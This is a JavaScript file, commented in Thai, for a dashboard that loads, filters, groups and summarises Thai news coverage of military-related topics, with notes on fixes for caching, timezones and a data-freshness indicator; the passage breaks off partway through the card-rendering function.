// ============================================================
// โหลดข้อมูลจาก data/news.json (path สัมพัทธ์ อยู่ repo เดียวกัน ไม่มีปัญหา CORS)
// ============================================================
var state = {
  allNews: [],
  filteredNews: [],
  topics: [],
  selectedCategories: new Set(), // ว่าง = ไม่กรอง (เอาทุกหมวด)
  selectedSources: new Set()     // ว่าง = ไม่กรอง (เอาทุกสำนักข่าว)
};

var THAI_MONTHS_ABBR = ['ม.ค.', 'ก.พ.', 'มี.ค.', 'เม.ย.', 'พ.ค.', 'มิ.ย.', 'ก.ค.', 'ส.ค.', 'ก.ย.', 'ต.ค.', 'พ.ย.', 'ธ.ค.'];

// ============================================================
// ตารางแปลง "โดเมน → ชื่อสำนักข่าว" สำหรับการแสดงผล
// (มีตารางเดียวกันในโค้ด Apps Script สำหรับรายงาน LINE — แก้ไขให้ตรงกันทั้งสองไฟล์)
// ============================================================
var SOURCE_NAME_URL_RULES = [
  ['topnews.co.th/news-clip', 'TOP News (video)']
];
var SOURCE_NAMES = {
  'topnews.co.th': 'TOP News',
  'naewna.com': 'แนวหน้า',
  'siamrath.co.th': 'สยามรัฐ',
  'mgronline.com': 'ผู้จัดการออนไลน์',
  'matichon.co.th': 'มติชน',
  'dailynews.co.th': 'เดลินิวส์',
  'khaosod.co.th': 'ข่าวสด',
  'thainews.prd.go.th': 'NBT Connext',
  'thaipost.net': 'ไทยโพสต์',
  'thairath.co.th': 'ไทยรัฐ',
  'bangkokbiznews.com': 'กรุงเทพธุรกิจ',
  'banmuang.co.th': 'บ้านเมือง',
  'chiangmainews.co.th': 'เชียงใหม่นิวส์',
  'thaipbs.or.th': 'Thai PBS',
  'nationtv.tv': 'เนชั่นทีวี',
  'pptvhd36.com': 'PPTV HD36',
  'news1live.com': 'NEWS1',
  'siamnews.com': 'สยามนิวส์',
  'antifakenewscenter.com': 'ศูนย์ต่อต้านข่าวปลอม',
  'fm91bkk.com': 'FM91',
  'thestandard.co': 'THE STANDARD',
  'innnews.co.th': 'INN News',
  'ch3plus.com': 'ช่อง 3',
  'komchadluek.net': 'คมชัดลึก',
  'prd.go.th': 'กรมประชาสัมพันธ์',
  'js100.com': 'จส.100',
  'sondhitalk.com': 'Sondhi Talk',
  'spacebar.th': 'SPACEBAR',
  'tnnthailand.com': 'TNN',
  'thaich8.com': 'ช่อง 8',
  'bangkok-today.com': 'Bangkok Today',
  'region3.prd.go.th': 'ปชส.เขต 3',
  'thansettakij.com': 'ฐานเศรษฐกิจ',
  'one31.net': 'ช่องวัน 31',
  'thailandplus.tv': 'Thailand Plus',
  'infoquest.co.th': 'อินโฟเควสท์',
  'voicetv.co.th': 'Voice TV',
  'posttoday.com': 'โพสต์ทูเดย์',
  'ejan.co': 'อีจัน',
  'surin.prd.go.th': 'ปชส.สุรินทร์',
  'bhumjaithai.com': 'พรรคภูมิใจไทย',
  'hatyaifocus.com': 'หาดใหญ่โฟกัส',
  'moneyandbanking.co.th': 'การเงินธนาคาร',
  'thaigov.go.th': 'รัฐบาลไทย',
  'royaloffice.th': 'หน่วยราชการในพระองค์',
  'ops.moe.go.th': 'ศธ.',
  'pr.moph.go.th': 'กระทรวงสาธารณสุข',
  'theactive.thaipbs.or.th': 'The Active',
  'transbordernews.in.th': 'สำนักข่าวชายขอบ',
  'twonewsonline.com': 'ทูนิวส์ออนไลน์'
};

// แปลงโดเมนเป็นชื่อสำนักข่าว: กฎ URL ก่อน → ตารางโดเมน → ไม่เจอคืนค่าเดิม
function displaySourceName(source, url) {
  var u = (url || '').toString().toLowerCase();
  for (var i = 0; i < SOURCE_NAME_URL_RULES.length; i++) {
    if (u && u.indexOf(SOURCE_NAME_URL_RULES[i][0]) !== -1) return SOURCE_NAME_URL_RULES[i][1];
  }
  var s = (source || '').toString().trim();
  return SOURCE_NAMES[s.toLowerCase()] || s;
}

// ============================================================
// หมวดประเด็น — ต้องตรงกับ CATEGORY_ORDER ในโค้ด Apps Script
// ⚠️ มี 2 สำเนา (ไฟล์นี้ + Apps Script) เวลาเพิ่ม/เปลี่ยนชื่อหมวดต้องแก้ทั้งคู่
// ============================================================
var CATEGORY_ORDER = [
  'ปราบปรามยาเสพติด',
  'ช่วยเหลือประชาชน/จิตอาสา',
  'ชายแดนไทย-กัมพูชา',
  'สถานการณ์ จชต.',
  'ความมั่นคงชายแดนอื่น',
  'พิธีการ/กิจกรรม',
  'การฝึก/ความพร้อมรบ',
  'กำลังพล/ทหารใหม่',
  'ความสัมพันธ์ทหารระหว่างประเทศ',
  'อื่นๆ'
];

// ⚠️ ชื่อหมวดเก่า → ชื่อปัจจุบัน (ตรงกับ CATEGORY_ALIASES ในโค้ด Apps Script)
//    ถ้าไม่มีตารางนี้ แถวที่ยังใช้ชื่อเดิมจะโผล่เป็น "หมวดที่ 11" ในตัวกรอง
//    ได้สีเทา default ในกราฟ และถูกนับแยกจากหมวดจริง
//    (ตรวจ 2 ส.ค. 69: ยังมี 'พิธีการ/ประเพณีทหาร' ค้างอยู่ 45 แถว)
var CATEGORY_ALIASES = {
  'พิธีการ/ประเพณีทหาร': 'พิธีการ/กิจกรรม'
};

function normalizeCategory(cat) {
  var c = (cat || '').toString().trim();
  if (!c) return 'อื่นๆ';
  return CATEGORY_ALIASES[c] || c;
}

// ⚠️ ลบทิ้ง 2 ส.ค. 69 (ยกเครื่องหน้าตา): CATEGORY_COLORS 10 สี + DEFAULT_CHART_COLOR
//    + categoryColor() — ตรวจด้วย grep แล้วไม่มีจุดไหนเรียกเลย เป็นโค้ดตายค้างมาจาก
//    ยุคที่ยังใช้กราฟโดนัท ตอนนี้ป้ายหมวดใช้ชิปเส้นขอบสีเดียวทุกหมวด

// ============================================================
// อ่านค่าสีจากโทเคน CSS (style.css) — แหล่งความจริงเดียวของสีทั้งระบบ
// ⚠️ ห้ามเขียน hex ลงในไฟล์นี้ ให้ประกาศโทเคนใน :root ของ style.css แล้วอ่านผ่านฟังก์ชันนี้
// ⚠️ ต้องอ่านตอน "สร้างกราฟ" ทุกครั้ง ไม่ใช่เก็บเป็นตัวแปรระดับไฟล์
//    เพราะค่าจะเปลี่ยนเมื่อผู้ใช้สลับโหมดมืด/สว่าง
// ============================================================
function cssVar(name) {
  return getComputedStyle(document.documentElement).getPropertyValue(name).trim();
}

// ระดับผลกระทบ — ใช้เลือก "ระดับสูงสุดในกลุ่ม" ให้ตรงกับที่ฝั่ง Apps Script ทำ
var IMPACT_RANK = { 'สูง': 3, 'กลาง': 2, 'ต่ำ': 1 };

function formatThaiDate(d) {
  return d.getDate() + ' ' + THAI_MONTHS_ABBR[d.getMonth()] + ' ' + (d.getFullYear() + 543);
}

/**
 * ⭐ เพิ่ม 4 ส.ค. 69 (R7) — แปลงวันที่จากช่องกรอก (yyyy-mm-dd) เป็นเวลาเริ่ม/สิ้นสุดวันตามเวลาไทย
 *
 * ช่อง <input type="date"> คืนค่าเป็น 'yyyy-mm-dd' เฉย ๆ ไม่มีโซนเวลา
 * ถ้าส่งเข้า new Date() ตรง ๆ JavaScript จะตีความเป็น UTC เที่ยงคืน ไม่ใช่เที่ยงคืนเวลาไทย
 * จึงต้องต่อ '+07:00' ให้ชัดเจน เพราะผู้ใช้กรอกโดยคิดเป็นเวลาไทยเสมอ
 *
 * คืน null เมื่อไม่ได้กรอก หรือกรอกค่าที่แปลงไม่ได้ = ไม่ใช้ตัวกรองนั้น
 * (ห้ามคืน NaN เด็ดขาด เพราะการเทียบกับ NaN เป็นเท็จเสมอ ตัวกรองจะเงียบและปล่อยผ่านทุกแถว)
 */
function thaiDayStartMs(ymd) {
  if (!ymd) return null;
  var ms = new Date(ymd + 'T00:00:00+07:00').getTime();
  return isNaN(ms) ? null : ms;
}

function thaiDayEndMs(ymd) {
  if (!ymd) return null;
  var ms = new Date(ymd + 'T23:59:59.999+07:00').getTime();
  return isNaN(ms) ? null : ms;
}

// ============================================================
// ⭐ S20 — ป้าย "ตรวจสอบล่าสุด" (เพิ่ม 8 ส.ค. 69)
//
// 🔴 เรื่องจริงที่ทำให้ต้องมี: 8 ส.ค. 69 หน้าเว็บค้างที่ 07:37 น. นาน 4 ชั่วโมง
//    ไล่ตรวจทุกชั้นแล้ว **ไม่มีอะไรพัง** — เสาร์เช้าข่าวเข้ามา 3 ชิ้นและถูกกรองออกถูกต้องหมด
//    แต่หน้าเว็บไม่มีทางบอกเรื่องนี้ได้เลย ผู้ใช้จึงต้องไปไล่ log GitHub Actions เอง
//
// 👉 ป้ายนี้แยก 2 คำถามที่คนละเรื่องกันออกจากกัน
//      "ข้อมูลล่าสุด"   = ข่าวใหม่ล่าสุดเข้ามาเมื่อไร   → นิ่งได้ ถ้าไม่มีข่าวก็ถูกแล้ว
//      "ตรวจสอบล่าสุด"  = ระบบไปดูชีตครั้งล่าสุดเมื่อไร → ถ้านิ่ง แปลว่ามีอะไรผิดจริง
//
// 🔇 กันเตือนมั่ว: เตือนเมื่อ "ไม่ได้ตรวจ" เกิน 3 ชั่วโมงเท่านั้น
//    hourlyScanJob ตั้ง everyHours(1) คือรันตลอด 24 ชม. (ไม่ได้หยุดกลางคืน)
//    ค่า 3 จึงเท่ากับ "พลาดติดกัน 3 รอบ" ซึ่งตรงกับเกณฑ์ที่ pushWebsiteUpdate_ ใช้เตือนอยู่แล้ว
//    ⚠️ ถ้าวันใดเปลี่ยน hourlyScanJob ไปหยุดกลางคืน ต้องมาแก้ค่านี้ด้วย ไม่งั้นจะเตือนทุกคืน
// ============================================================
var HEARTBEAT_STALE_HOURS = 3;

/**
 * 🆕 18 ส.ค. 69 (S21) — แยก "ไปเอาชีพจร" ออกจาก "วาดชีพจร"
 *
 * เหตุผล: loadData ต้องรู้ `dataAt` **ก่อน** โหลดข่าว เพื่อเอาไปทำเลขรุ่นของ URL
 * 🔒 ไฟล์นี้ต้องสดเสมอ จึงคง cache:'no-store' ไว้ — และมันแค่ ~110 ไบต์
 *    (มันคือตัวที่ตัดสินว่า "ข้อมูลสดหรือยัง" ถ้าตัวนี้เก่า ทุกอย่างที่ตามมาเก่าหมด)
 */
async function fetchHeartbeat() {
  try {
    var res = await fetch('data/heartbeat.json', { cache: 'no-store' });
    // ⚠️ ไม่มีไฟล์ = ยังไม่ได้ติดตั้ง S20 หรือรอบแรกยังไม่รัน → คืน null เงียบ ๆ
    //    ห้ามขึ้นข้อความชวนตกใจ เพราะมันไม่ใช่อาการพัง
    if (!res.ok) return null;
    return await res.json();
  } catch (err) {
    // ⚠️ ชีพจรพังต้องไม่ทำให้หน้าเว็บพัง — ผู้เรียกจะถอยไปใช้ no-store แบบเดิม
    console.warn('อ่าน heartbeat.json ไม่ได้ (ไม่กระทบรายการข่าว):', err);
    return null;
  }
}

/** วาดป้ายชีพจร — รับของที่โหลดมาแล้ว ไม่ยิง fetch ซ้ำ */
function showHeartbeat(hb) {
  var el = document.getElementById('lastChecked');
  if (!el || !hb) return;
  try {
    var t = new Date(hb.checkedAt);
    if (isNaN(t.getTime())) return;

    var lagH = (Date.now() - t.getTime()) / 3600000;
    var when = formatThaiDate(t) + ' ' +
      t.toLocaleTimeString('th-TH', { hour: '2-digit', minute: '2-digit' }) + ' น.';
    var what = hb.result === 'updated' ? 'มีข่าวใหม่เข้ามา' : 'ไม่มีข่าวใหม่';

    if (lagH > HEARTBEAT_STALE_HOURS) {
      // ⚠️ ใช้สัญลักษณ์ + ตัวหนาแทนการใส่สีใหม่ เพราะไม่อยากแตะ style.css
      //    (ตัวหนาอ่านออกทั้งโหมดมืดและสว่าง ไม่ต้องเดาว่าสีไหนคอนทราสต์พอ)
      el.innerHTML = '⚠️ <strong>ไม่ได้ตรวจสอบมา ' + lagH.toFixed(1) + ' ชั่วโมง</strong> — ' +
        'ตรวจครั้งล่าสุด ' + escapeHtml(when) + ' (ปกติตรวจทุกชั่วโมง)';
    } else {
      el.textContent = 'ตรวจสอบล่าสุด: ' + when + ' — ' + what;
    }
    el.hidden = false;
  } catch (err) {
    // ⚠️ ป้ายบรรทัดที่สองพัง ต้องไม่ทำให้หน้าเว็บพัง — แค่ไม่โชว์
    console.warn('อ่าน heartbeat.json ไม่ได้ (ไม่กระทบรายการข่าว):', err);
  }
}

async function loadData() {
  try {
    // 🆕 S21 (18 ส.ค. 69) — เลิกสั่งห้ามแคช เปลี่ยนไปผูก URL กับ "เลขรุ่นของข้อมูล"
    //
    // 💥 ปัญหาเดิม: cache:'no-store' = สั่งเบราว์เซอร์ห้ามเก็บ และห้ามแม้แต่ถามว่า "เปลี่ยนไหม"
    //    ⇒ เปิด/รีเฟรชทีไร โหลด news.json ใหม่ทั้งก้อน (2.6 MB) แม้ข่าวไม่เปลี่ยนแม้แต่ใบเดียว
    //    วัดจริง 18 ส.ค. 69: ข่าวเปลี่ยนจริงแค่ 6-8 รอบ จาก 24 รอบ/วัน
    //    ⇒ การโหลดส่วนใหญ่คือการโหลดของเดิมซ้ำ
    //
    // 🔑 ทำไม dataAt ใช้เป็นเลขรุ่นได้: เพราะกลไก S19 เขียน news.json เฉพาะตอนเนื้อข่าวเปลี่ยนจริง
    //    ⇒ dataAt เปลี่ยน "ตามข่าว" ไม่ใช่ "ตามเวลา" ⇒ URL จึงเปลี่ยนตามข่าวไปด้วย
    //    ⇒ ข่าวไม่เปลี่ยน = URL เดิม = เบราว์เซอร์ใช้ของในแคช (โหลดจริงแค่ชีพจร ~110 ไบต์)
    //    ⇒ ข่าวเปลี่ยน = URL ใหม่ทันที = ไม่มีทางเห็นของเก่า
    //
    // 🔒 ไม่มีชีพจร (ไฟล์หาย/รอบแรก) → ถอยไปใช้ no-store แบบเดิมเป๊ะทุกประการ
    var hb = await fetchHeartbeat();
    var useVer = !!(hb && hb.dataAt);
    var res = useVer
      ? await fetch('data/news.json?v=' + encodeURIComponent(hb.dataAt))
      : await fetch('data/news.json', { cache: 'no-store' });
    var data = await res.json();

    // 🔒 ด่านกันของเก่า — ไฟล์ที่ได้ต้องตรงกับเลขรุ่นที่ชีพจรบอก
    //    ไม่ตรง = ชีพจรกับข้อมูลไม่ตรงกัน (เช่นรอบก่อนเขียน heartbeat ไม่สำเร็จ)
    //    ⇒ ยิงซ้ำแบบไม่ใช้แคชทันที · เกิดยากมาก แต่ถ้าเกิดต้องไม่ปล่อยให้ผู้ใช้เห็นข่าวเก่า
    if (useVer && data.generatedAt && data.generatedAt !== hb.dataAt) {
      console.warn('news.json ไม่ตรงกับชีพจร (' + data.generatedAt + ' ≠ ' + hb.dataAt +
                   ') — โหลดใหม่แบบไม่ใช้แคช');
      data = await (await fetch('data/news.json', { cache: 'no-store' })).json();
    }

    state.allNews = data.news || [];

    // ทำข้อมูลให้เป็นมาตรฐานตั้งแต่โหลด — การ์ด/ตัวกรอง/กราฟ/CSV ได้ค่าเดียวกันทุกจุด
    // ⚠️ ต้องทำที่นี่จุดเดียว ห้ามไปแปลงซ้ำที่ปลายทาง ไม่งั้นจะหลุดบางจุดเหมือนที่เคยพลาด
    state.allNews.forEach(function (n) {
      n.source = displaySourceName(n.source, n.url);
      n.category = normalizeCategory(n.category);
    });

    var updatedEl = document.getElementById('lastUpdated');
    if (data.generatedAt) {
      // ⚠️ เปลี่ยนคำ 4 ส.ค. 69 จาก "อัปเดตล่าสุด" เป็น "ข้อมูลล่าสุด" (คู่กับ S19)
      //    ตั้งแต่ 4 ส.ค. generatedAt = "เวลาที่ข้อมูลเปลี่ยนจริง" ไม่ใช่ "เวลาที่รันสคริปต์"
      //    รอบที่ดึงมาแล้วข่าวเหมือนเดิม จะไม่เขียนไฟล์ เวลานี้จึงไม่ขยับ
      //    ถ้าเวลานี้ค้างนานผิดปกติ = ต้นทางหยุดเก็บข่าว ซึ่งเป็นสิ่งที่ต้องการให้เห็น
      //    (ของเดิมเวลาขยับทุกชั่วโมงเสมอ หน้าเว็บจึง "ดูสด" ได้แม้ข่าวหยุดมาหลายวัน)
      updatedEl.textContent = 'ข้อมูลล่าสุด: ' + formatThaiDate(new Date(data.generatedAt)) + ' ' +
        new Date(data.generatedAt).toLocaleTimeString('th-TH', { hour: '2-digit', minute: '2-digit' }) + ' น.';
    } else {
      updatedEl.textContent = 'ยังไม่มีข้อมูล (รอรอบอัปเดตแรกจาก GitHub Actions)';
    }

    // ⭐ S20 (8 ส.ค. 69) — บอกผู้ใช้ว่า "ระบบยังตรวจอยู่นะ" แม้ข้อมูลจะไม่ขยับ
    //    ต้องเรียกหลังป้าย "ข้อมูลล่าสุด" ตั้งค่าเสร็จ และห้ามให้มัน throw ออกมา
    //    (ของหลักคือรายการข่าว ห้ามให้ป้ายบรรทัดที่สองทำให้ทั้งหน้าโหลดไม่ขึ้น)
    showHeartbeat(hb);   // 🆕 ส่งของที่โหลดมาแล้ว ไม่ยิง fetch ซ้ำ

    setupMultiselect('category', 'categoryMultiselect', 'categoryToggle', 'categoryPanel', 'ทุกหมวด');
    setupMultiselect('source', 'sourceMultiselect', 'sourceToggle', 'sourcePanel', 'ทุกสำนักข่าว');
    applyFiltersAndRender();

    // ⭐ แก้ 4 ส.ค. 69 (R12): ถ้าผู้ใช้กดแท็บ "กราฟสรุป" ไปแล้วระหว่างรอโหลด
    //    renderCharts() จะเคยถูกเรียกตอนที่ state.allNews ยังว่าง แล้วตั้งธง chartsRendered
    //    ทำให้กราฟว่างค้างถาวร ไม่มีจุดไหนวาดใหม่อีกเลย — ต้องวาดซ้ำตรงนี้เมื่อข้อมูลมาถึง
    //    (news.json ~1.9 MB เน็ตช้าจะเห็นอาการนี้ชัด)
    if (chartsRendered) renderCharts();
  } catch (err) {
    // ⚠️ escape ข้อความ error ด้วย — err.message อาจมีเนื้อหาจากไฟล์ที่โหลดมาปนอยู่
    document.getElementById('resultsGrid').innerHTML =
      '<div class="empty">โหลดข้อมูลไม่สำเร็จ: ' + escapeHtml(err && err.message) + '</div>';
    console.error(err);
  }
}

// ============================================================
// ตัวกรองแบบเลื่อนลงติ๊กหลายชนิด (multiselect dropdown)
// ============================================================
function setupMultiselect(kind, containerId, toggleId, panelId, allLabel) {
  var field = kind === 'category' ? 'category' : 'source';
  var selectedSet = kind === 'category' ? state.selectedCategories : state.selectedSources;

  var values = Array.from(new Set(state.allNews.map(function (n) { return n[field] || '-'; })));
  if (kind === 'category') {
    // เรียงตามลำดับความสำคัญที่ระบบกำหนด ไม่ใช่ตามตัวอักษร
    // หมวดแปลกที่ไม่อยู่ในรายการ (ถ้ามี) ไปต่อท้าย — จะได้เห็นว่ามีของหลุดเข้ามา
    values.sort(function (a, b) {
      var ia = CATEGORY_ORDER.indexOf(a), ib = CATEGORY_ORDER.indexOf(b);
      if (ia === -1 && ib === -1) return a.localeCompare(b, 'th');
      if (ia === -1) return 1;
      if (ib === -1) return -1;
      return ia - ib;
    });
  } else {
    values.sort();
  }

  var panel = document.getElementById(panelId);
  var clearRow = document.createElement('div');
  clearRow.className = 'ms-clear';
  clearRow.textContent = 'ล้างตัวเลือกทั้งหมด';
  clearRow.addEventListener('click', function () {
    selectedSet.clear();
    updateMultiselectUI(kind, containerId, toggleId, panelId, allLabel);
    applyFiltersAndRender();
  });
  panel.innerHTML = '';
  panel.appendChild(clearRow);

  values.forEach(function (v) {
    var label = document.createElement('label');
    var checkbox = document.createElement('input');
    checkbox.type = 'checkbox';
    checkbox.value = v;
    checkbox.addEventListener('change', function () {
      if (checkbox.checked) selectedSet.add(v); else selectedSet.delete(v);
      updateMultiselectUI(kind, containerId, toggleId, panelId, allLabel);
      applyFiltersAndRender();
    });
    label.appendChild(checkbox);
    label.appendChild(document.createTextNode(v));
    panel.appendChild(label);
  });

  var toggleBtn = document.getElementById(toggleId);
  toggleBtn.addEventListener('click', function (e) {
    e.stopPropagation();
    var isOpen = !panel.hidden;
    document.querySelectorAll('.multiselect-panel').forEach(function (p) { p.hidden = true; });
    panel.hidden = isOpen;
  });

  document.addEventListener('click', function (e) {
    var container = document.getElementById(containerId);
    if (!container.contains(e.target)) panel.hidden = true;
  });

  updateMultiselectUI(kind, containerId, toggleId, panelId, allLabel);
}

function updateMultiselectUI(kind, containerId, toggleId, panelId, allLabel) {
  var selectedSet = kind === 'category' ? state.selectedCategories : state.selectedSources;
  var toggleBtn = document.getElementById(toggleId);
  if (selectedSet.size === 0) {
    toggleBtn.textContent = allLabel + ' ▾';
  } else {
    toggleBtn.textContent = 'เลือกแล้ว ' + selectedSet.size + ' รายการ ▾';
  }
}

// ============================================================
// จัดกลุ่มข่าวตามรหัสกลุ่มข่าว (eventGroup) -> ได้ "ประเด็น"
// ============================================================
function groupIntoTopics(newsList) {
  var map = {};
  newsList.forEach(function (n) {
    var code = n.eventGroup || ('SINGLE-' + n.title + n.datetime);
    if (!map[code]) {
      map[code] = {
        code: code, category: n.category, isNegative: false, impact: '-',
        // hasName = ประเด็นนี้ได้ชื่อจาก "แกนเหตุการณ์" (คอลัมน์ R) แล้วหรือยัง
        title: n.title, hasName: false, summary: n.summary,
        earliestDate: n.datetime, count: 0, negCount: 0, sources: []
      };
    }
    var t = map[code];

    // ⭐ เพิ่ม 4 ส.ค. 69 (S18) — ชื่อประเด็นต้องเป็นชุดเดียวกับรายงาน LINE
    //    เดิมเว็บใช้ "พาดหัวข่าวที่เก่าที่สุดในกลุ่ม" ซึ่งเป็นพาดหัวดิบจากสำนักข่าว
    //    มีชื่อสำนักห้อยท้าย ("- Thai PBS") มีคำเร้าอารมณ์ ("ด่วน!") และยาวกว่า
    //    ผู้ใช้คนเดียวกันจึงเห็นประเด็นเดียวกันคนละชื่อระหว่างเว็บกับ LINE
    //
    //    กติกาตรงนี้ลอกจากฝั่ง Apps Script แบบคำต่อคำ เพื่อให้ผลออกมาเท่ากันเป๊ะ:
    //      1) ใช้ค่าคอลัมน์ R ตัวแรกที่ไม่ว่างในกลุ่ม
    //      2) ถ้าทั้งกลุ่มไม่มีเลย จึงถอยไปใช้พาดหัวของข่าวที่เก่าที่สุด
    //    ⚠️ ข้อ 1 ปลอดภัยเพราะวัดข้อมูลจริง 4 ส.ค. 69 แล้วพบว่า
    //       ไม่มีกลุ่มไหนเลย (0/994) ที่สมาชิกให้ค่าคอลัมน์ R ขัดกัน
    //       จึงไม่สำคัญว่าจะไล่ข่าวจากใหม่ไปเก่าหรือเก่าไปใหม่ ได้ชื่อเดียวกัน
    var evName = (n.eventTitle || '').trim();
    if (!t.hasName && evName) {
      t.title = evName;
      t.hasName = true;
    }

    t.count++;
    t.sources.push({ source: n.source, url: n.url, datetime: n.datetime });
    // ⚠️ แก้ 2 ส.ค. 69: เดิมเขียนทับ t.impact ทุกรอบ → ได้ค่าของข่าวชิ้นสุดท้าย ไม่ใช่ระดับสูงสุด
    //    วัดแล้วมี 8 กลุ่มที่ระดับปนกัน (เช่น 'ประธานสภาฯ เสนอยุบ กอ.รมน.' มีทั้ง สูง และ กลาง)
    //    ทำให้ตัวเลขบนเว็บกับในรายงาน LINE ไม่ตรงกัน เพราะฝั่งนั้นเอาค่าสูงสุด
    if (n.isNegative) {
      t.isNegative = true;
      t.negCount++;
      if ((IMPACT_RANK[n.impact] || 0) > (IMPACT_RANK[t.impact] || 0)) t.impact = n.impact;
    }
    if (new Date(n.datetime) < new Date(t.earliestDate)) {
      t.earliestDate = n.datetime;
      // ถอยไปใช้พาดหัวข่าวเก่าสุด เฉพาะเมื่อทั้งกลุ่มยังไม่มีชื่อจากคอลัมน์ R (S18)
      if (!t.hasName) t.title = n.title;
    }
    if ((n.summary || '').length > (t.summary || '').length) t.summary = n.summary;
  });
  return Object.keys(map).map(function (k) { return map[k]; });
}

function uniqueSourceCount(topic) {
  return new Set(topic.sources.map(function (s) { return s.source; })).size;
}

// ============================================================
// กรองและเรนเดอร์
// ============================================================
function applyFiltersAndRender() {
  var q = document.getElementById('searchInput').value.trim().toLowerCase();
  var dateFrom = document.getElementById('dateFrom').value;
  var dateTo = document.getElementById('dateTo').value;
  var onlyToday = document.getElementById('onlyToday').checked;
  var onlyLast3Days = document.getElementById('onlyLast3Days').checked;
  var onlyNegative = document.getElementById('onlyNegative').checked;
  var sortOrder = document.getElementById('sortOrder').value;

  var todayStart = new Date();
  todayStart.setHours(0, 0, 0, 0);
  var last3DaysStart = new Date(todayStart.getTime() - 2 * 86400000); // รวมวันนี้ + 2 วันก่อนหน้า = 3 วัน

  // ⭐ แก้ 4 ส.ค. 69 (R7) — ตัวกรอง "จากวันที่/ถึงวันที่" เคยเลื่อนไป 7 ชั่วโมง
  //
  //    ของเดิมเทียบ "สตริงกับสตริง": n.datetime < dateFrom
  //    แต่ n.datetime เก็บเป็น ISO ซึ่งเป็นเวลา UTC ส่วนช่องกรอกวันที่คนกรอกเป็นเวลาไทย
  //    เท่ากับเอาเวลาคนละโซนมาเทียบกันตรง ๆ ผลคือเส้นแบ่งวันเลื่อนไป 7 ชม.
  //      ข่าวเวลาไทย 3 ส.ค. 05:30 เก็บเป็น 2026-08-02T22:30Z → ตั้ง "จาก 3 ส.ค." แล้วหาย
  //      ข่าวเวลาไทย 4 ส.ค. 06:30 เก็บเป็น 2026-08-03T23:30Z → ตั้ง "ถึง 3 ส.ค." แล้วหลุดเข้ามา
  //    วัดกับข้อมูลจริง 4 ส.ค. 69: ข่าวที่อยู่ในช่วงเวลาไทย 00:00-06:59 = 357/1,851 = 19.3%
  //
  //    ตอนนี้แปลงวันที่ที่กรอกเป็นหลักเวลาไทย (+07:00) ให้เป็นมิลลิวินาทีก่อน แล้วค่อยเทียบตัวเลข
  //    ⚠️ คำนวณนอกลูป — ของเดิมต่อสตริง dateTo + 'T23:59:59' ใหม่ทุกแถว (1,851 ครั้งต่อการพิมพ์ 1 ตัวอักษร)
  var fromMs = thaiDayStartMs(dateFrom);
  var toMs = thaiDayEndMs(dateTo);

  var filtered = state.allNews.filter(function (n) {
    if (state.selectedCategories.size > 0 && !state.selectedCategories.has(n.category)) return false;
    if (state.selectedSources.size > 0 && !state.selectedSources.has(n.source)) return false;

    // ⭐ ตัวกรองธงข่าวลบ — กรองที่ระดับ "ข่าว" ไม่ใช่ระดับ "ประเด็น"
    //    ผลคือประเด็นที่มีทั้งข่าวลบและไม่ลบ จะเหลือเฉพาะข่าวลบในการ์ด ซึ่งตรงกับที่ผู้ใช้ถาม
    if (onlyNegative && !n.isNegative) return false;

    if (fromMs !== null || toMs !== null) {
      var tMs = new Date(n.datetime).getTime();
      if (fromMs !== null && tMs < fromMs) return false;
      if (toMs !== null && tMs > toMs) return false;
    }

    if (onlyToday && new Date(n.datetime) < todayStart) return false;
    if (onlyLast3Days && new Date(n.datetime) < last3DaysStart) return false;

    if (q) {
      // ⭐ เพิ่ม n.eventTitle 4 ส.ค. 69 — คู่กับ S18
      //    ตั้งแต่การ์ดโชว์ "แกนเหตุการณ์" เป็นชื่อประเด็น ผู้ใช้จะค้นด้วยคำที่เห็นบนการ์ด
      //    ถ้าไม่ใส่ไว้ในกองค้น จะกลายเป็น "ค้นคำที่เห็นอยู่ตรงหน้าแล้วไม่เจอ"
      var hay = (n.title + ' ' + (n.eventTitle || '') + ' ' + n.summary + ' ' + n.source).toLowerCase();
      if (hay.indexOf(q) === -1) return false;
    }
    return true;
  });

  state.filteredNews = filtered;

  var topics = groupIntoTopics(filtered);
  if (sortOrder === 'count') {
    topics.sort(function (a, b) { return b.count - a.count; });
  } else if (sortOrder === 'asc') {
    topics.sort(function (a, b) { return new Date(a.earliestDate) - new Date(b.earliestDate); });
  } else {
    topics.sort(function (a, b) { return new Date(b.earliestDate) - new Date(a.earliestDate); });
  }
  state.topics = topics;

  renderStats(filtered, topics);
  renderResults(topics);
}

function renderStats(filtered, topics) {
  var sourceSet = new Set(filtered.map(function (n) { return n.source; }));
  // ⭐ เพิ่ม 2 ส.ค. 69 — ข่าวลบเป็นตัวชี้วัดหลักของทีมโฆษกแล้ว แต่แท็บนี้ไม่เคยแสดง
  //    (แท็บกราฟมีมาตั้งแต่แรก แท็บรายการเพิ่งมี)
  var negTopics = topics.filter(function (t) { return t.isNegative; }).length;
  var negPct = topics.length ? Math.round(100 * negTopics / topics.length) : 0;

  document.getElementById('statGrid').innerHTML =
    '<div class="stat-card"><p class="label">ประเด็นทั้งหมด</p><p class="value">' + topics.length + '</p></div>' +
    '<div class="stat-card"><p class="label">นำเสนอข่าว (ครั้ง)</p><p class="value accent">' + filtered.length + '</p></div>' +
    '<div class="stat-card"><p class="label">ประเด็นข่าวลบ</p><p class="value negative">' + negTopics +
      '<span class="value-sub">' + negPct + '%</span></p></div>' +
    '<div class="stat-card"><p class="label">สำนักข่าว</p><p class="value">' + sourceSet.size + '</p></div>';

  document.getElementById('resultCount').textContent =
    'พบ ' + topics.length + ' ประเด็น (' + filtered.length + ' ข่าว) · ในนั้นเป็นข่าวลบ ' + negTopics + ' ประเด็น';
}

function renderResults(topics) {
  var grid = document.getElementById('resultsGrid');
  if (topics.length === 0) {
    grid.innerHTML = '<div class="empty">ไม่พบข่าวที่ตรงเงื่อนไข</div>';
    return;
  }

  grid.innerHTML = topics.map(function (t) {
    // ป้ายหมวด — ชิปเส้นขอบสีเดียวทุกหมวด ไม่มีสีประจำหมวดแล้ว (2 ส.ค. 69 ยกเครื่องหน้าตา)
    //    เหตุผล: พาเลตต์ sage เกือบเป็นสีเดียว ทำ 10 สีให้แยกออกด้วยตาไม่ได้จริง
    //    และการเติมสีหมวดเข้าไปทำให้กติกา "แดง = ข่าวลบ" อ่านไม่ขาด ซึ่งสำคัญกว่า
    var badges = '<span class="badge">' + escapeHtml(t.category) + '</span>';

    // ป้าย "ประเด็นร้อน" 3 ระดับ อิงจำนวนลิงก์ที่นำเสนอในประเด็น (t.count นับทุกลิงก์ ซ้ำสำนักได้)
